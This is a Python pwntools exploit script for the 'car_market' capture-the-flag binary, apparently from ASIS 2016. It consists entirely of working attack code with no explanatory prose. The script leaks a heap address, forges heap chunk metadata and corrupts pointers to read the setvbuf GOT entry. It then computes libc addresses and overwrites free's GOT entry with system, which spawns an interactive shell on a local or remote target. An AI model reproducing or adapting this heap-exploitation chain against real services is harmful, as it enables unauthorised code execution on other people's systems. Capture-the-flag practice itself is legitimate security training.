#!/usr/bin/env python

from pwn import *
import sys

'''

[car1*][car2*][car3*][car4*][car5*]
  v
  [ model | price | N/A  |  customer* ]
                               v
                               [  firstName  |  name  |  *comment ]
                                                           v
                                                           [ blah blah blah blah ]

typedef struct {
	char firstName[0x20];
	char name[0x20];
	char *comment[0x48];	
} customer;

struct car {
	char model[0x10];
	int price;
	int N/A
	customer *cust;
};

'''

def add_car(model, price):
	r.sendline('2')
	r.recvuntil("Enter car model\n")
	r.sendline(model)
	r.recvuntil('Enter car price\n')
	r.sendline(str(price))
	r.recvuntil('>\n')

def setCustName(name):
	r.sendline('1')
	r.recvuntil('Enter name :')
	r.sendline(name)
	r.recvuntil('>\n')

def setCustComment(comment):
	r.sendline('3')
	r.recvuntil('Enter coment :')
	r.sendline(comment)
	r.recvuntil('>\n')

def viewInfo():
	r.sendline('1')
	data = r.recvuntil('\n\n')
	return data

def setFirstName(fname):
	r.sendline('2')
	r.recvuntil('Enter first name : \n')
	r.sendline(fname)
	r.recvuntil('>\n')

def setModel(m):
	r.sendline('2')
	r.recvuntil('Enter car model\n')
	r.sendline(m)
	r.recvuntil('>\n')

def setPrice(price):
	r.sendline('3')
	r.recvuntil('Enter car price\n')
	r.sendline(price)
	r.recvuntil('>\n')


def exploit(r):
	r.recvuntil('>\n')
	add_car('tesla1', 255)
	r.sendline('4')			# select car
	r.sendline('0')			# index
	r.recvuntil('>\n')
	r.sendline('4')			# add customer
	r.recvuntil('>\n')
	setCustName("A" * 0x20)
	setCustComment('blah')
	r.sendline('4')			# return to car menu
	r.recvuntil('>\n')

	leak = u64(viewInfo().split('\n')[3][39:].ljust(8, '\0'))

	log.info("Leak: " + hex(leak))

	r.sendline('5')
	r.recvuntil('>\n')

	car2 = p64(0)
	car2 += p64(0xc0)
	car2_price = leak - 0x8a0

	add_car(car2, car2_price)
	r.sendline('4')
	r.sendline('1')
	r.recvuntil('>\n')
	r.sendline('4')
	r.recvuntil('>\n')
	setCustName("D" * 0x20)
	comment = p64(0)
	comment += p64(0)
	comment += p64(0)
	comment += p64(0x21)
	comment += p64(leak + 0xa0)
	comment += p64(leak + 0xa0)
	comment += p64(0x20)
	comment += p64(0x20)
	comment += p64(0x20)
	setCustComment(comment)

	name = p64(0x41414141)
	name += p64(0x41414141)
	name += p64(leak + 0xe0)
	name += p64(leak + 0xe0)
	setCustName(name)
	cust2_fname = p64(0)
	cust2_fname += p64(0x20)
	cust2_fname += p64(leak + 0x50)
	cust2_fname += p64(0)
	setFirstName(cust2_fname)
	r.sendline('4')			# return to car menu
	r.recvuntil('>\n')
	setModel(car2)
	setPrice(str(car2_price))
	r.sendline('4')

	cmt = p64(0) * 7
	cmt += p64(leak - 0x890)
	setCustComment(cmt)
	r.sendline('4')
	r.sendline('5')
	pause()
	add_car('FFFF', 123)
	r.sendline('4')
	r.sendline('2')
	r.recvuntil('>\n')
	r.sendline('5')
	add_car('AAAA', 255)
	r.sendline('3')		# remove car
	r.sendline('2')
	r.sendline('4')		# select car
	r.sendline('1')		# index 1
	r.sendline('4')		# add customer
	setCustName(p64(leak - 0x888))

	r.sendline('4')
	r.recvuntil('>\n')
	r.sendline('5')
	r.recvuntil('>\n')
	r.sendline('4')	# select car
	r.sendline('4')	# index 4

	elf = ELF('./car_market')
	setModel(p64(elf.got['setvbuf']))
	r.sendline('5')
	r.recvuntil('>\n')
	r.sendline('4')	# select car
	r.sendline('1')	# index
	r.sendline('1')	# info
	r.recvuntil('Model  : ')
	addr_setvbuf = u64(r.recv(6).ljust(8, '\0'))
	log.info("Setvbuf: " + hex(addr_setvbuf))
	addr_system = addr_setvbuf - 0x2aa30	# 0x2aa30
	addr_binsh = addr_setvbuf + 0x11c7db	# 0x11c7db
	log.info("System: " + hex(addr_system))
	log.info("/bin/sh: " + hex(addr_binsh))
	r.sendline('5')
	r.recvuntil('>\n')
	r.sendline('4')	# select
	r.sendline('4')
	setModel(p64(elf.got['free']) + p64(addr_binsh))
	r.sendline('5')
	r.recvuntil('>\n')
	r.sendline('4')	# select
	r.sendline('1')	# index
	r.recvuntil('>\n')
	setModel(p64(addr_system)[:-1] + "\n")
	r.sendline('5')
	r.recvuntil('>\n')
	r.sendline('3')
	r.sendline('2')
	r.clean()

	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/asis-2016/car_market/Car_Market/car_market'])
        print util.proc.pidof(r)
        pause()
        exploit(r)